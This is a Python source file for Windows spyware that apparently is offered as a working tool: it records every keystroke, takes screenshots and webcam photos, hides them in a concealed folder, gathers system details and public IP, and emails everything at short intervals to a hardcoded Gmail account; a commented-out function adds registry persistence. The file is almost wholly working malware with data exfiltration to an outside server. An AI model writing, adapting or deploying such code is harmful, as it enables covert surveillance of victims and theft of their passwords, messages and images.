import smtplib
import imghdr
from email.message import EmailMessage
import pyautogui
import cv2
import time
import os
import keyboard
from datetime import datetime
import threading
from pynput.keyboard import Key
import winreg as reg
from multiprocessing import Process
import ctypes
import platform
import socket
from requests import get
import shutil

'''def AddToRegistry():
    pth = os.path.dirname(os.path.realpath(__file__))
    s_name="mYscript.py"    
    address=os.join(pth,s_name)
    key = 'HKEY_CURRENT_USER'
    key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
    open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS)
    reg.SetValueEx(open,"any_name",0,reg.REG_SZ,address)
    reg.CloseKey(open)

AddToRegistry()'''

Sender_Email = 'vidiksmirka@gmail.com'
Reciever_Email = Sender_Email
Password = 'sdfdfe5435hhdgf'
interval = 12

public_ip = get('http://api.ipify.org').text

directory = os.mkdir(f"C:\\Users\\Public\\Public 3D Objects\\")
ctypes.windll.kernel32.SetFileAttributesW(f"C:\\Users\\Public\\Public 3D Objects\\", 2)

files = [f"C:\\Users\\Public\\Public 3D Objects\\screenshot.png", f"C:\\Users\\Public\\Public 3D Objects\\opencv0.png"]

class Screenshots:
    def __init__(self, email, password, interval):
        self.email = email
        self.password = password
        self.interval = interval

    def screenshot(self):
        try:
            global return_value, filename, file_type, i
            cam = cv2.VideoCapture(0)
            for i in range(1):
                return_value, image = cam.read()
                filename = cv2.imwrite(f"C:\\Users\\Public\\Public 3D Objects\\opencv0.png", image)
            del(cam)

            pyautogui.screenshot(f"C:\\Users\\Public\\Public 3D Objects\\screenshot.png")

            timer = threading.Timer(self.interval, self.screenshot)
            timer.start()
        
            newMessage = EmailMessage()                         
            newMessage['Subject'] = "Check out the Logs!"
            newMessage['From'] = Sender_Email                   
            newMessage['To'] = Reciever_Email                   
            newMessage.set_content('New logs sent from your keylogger!')

            for file in files:
                with open(file, 'rb') as f:
                    file_data = f.read()
                    file_type = imghdr.what(f.name)
                    file_name = f.name

                newMessage.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)

            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
                smtp.login(Sender_Email, Password)              
                smtp.send_message(newMessage)

            os.remove(f"C:\\Users\\Public\\Public 3D Objects\\opencv0.png")
            os.remove(f"C:\\Users\\Public\\Public 3D Objects\\screenshot.png")

        except:
            pyautogui.screenshot(f"C:\\Users\\Public\\Public 3D Objects\\screenshot.png")
            timer = threading.Timer(self.interval, self.screenshot)
            timer.start()
        
            newMessage = EmailMessage()                         
            newMessage['Subject'] = "Check out the Logs!"
            newMessage['From'] = Sender_Email                   
            newMessage['To'] = Reciever_Email                   
            newMessage.set_content('New logs sent from your keylogger!')

            with open(f"C:\\Users\\Public\\Public 3D Objects\\screenshot.png", 'rb') as f:
                file_data = f.read()
                file_type = imghdr.what(f.name)
                file_name = f.name

            newMessage.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)

            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
                smtp.login(Sender_Email, Password)              
                smtp.send_message(newMessage)

            os.remove(f"C:\\Users\\Public\\Public 3D Objects\\screenshot.png")

keylogger = Screenshots(Sender_Email, Password, interval)
keylogger.screenshot()

class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = f"""KeyLogger Started...
        From {platform.system()} {platform.release()} {platform.win32_edition()} | Version: {platform.version()}
        {socket.gethostbyname(socket.gethostname())}
        Public IP: {public_ip}"""
        self.email = email
        self.password = password

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def send_mail(self, email, password, message):
        server = smtplib.SMTP(host='smtp.gmail.com', port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()
    
    def run(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

keylogger = KeyLogger(interval, Sender_Email, Password)
keylogger.run()

if __name__ == '__main__':
    p = Process(target=KeyLogger, args=()).start()
    p3 = Process(target=Screenshots, args=()).start()